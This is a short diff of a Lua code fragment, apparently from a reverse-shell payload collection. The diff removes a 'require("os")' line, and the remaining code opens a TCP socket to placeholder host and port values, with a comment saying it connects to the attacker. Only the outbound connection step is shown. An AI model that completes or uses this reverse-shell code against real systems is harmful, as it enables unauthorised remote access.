@@ -1,5 +1,4 @@
 socket = require("socket")
-require("os")
 
 -- Open a new socket and connect to the attacker, the socket is associated with file descriptor 3 automatically
 socket.tcp():connect("*\host*", *\port*)
